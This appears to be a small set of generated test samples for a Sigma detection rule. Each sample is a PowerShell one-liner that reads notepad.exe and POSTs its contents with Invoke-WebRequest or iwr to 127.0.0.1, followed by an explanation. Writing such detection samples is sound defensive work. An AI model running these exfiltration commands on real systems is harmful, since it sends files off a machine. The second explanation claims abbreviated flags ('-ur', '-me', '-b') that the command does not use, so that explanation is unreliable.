output: powershell.exe -Command "& { $content = Get-Content C:\Windows\System32\notepad.exe; Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content }"
explanation: This command uses PowerShell to read a file and send its contents via a POST request. It matches the Sigma rule by using `Invoke-WebRequest` with `-Uri`, `-Method`, and `-Body` flags.

output: powershell.exe -Command "& { $content = Get-Content C:\Windows\System32\notepad.exe; iwr -Uri http://127.0.0.1 -Method POST -Body $content }"
explanation: This command uses PowerShell with the `iwr` alias for `Invoke-WebRequest` to send the contents of a file via a POST request. It matches the Sigma rule by using the shortest possible flag versions (`-ur`, `-me`, `-b`) and includes a payload.
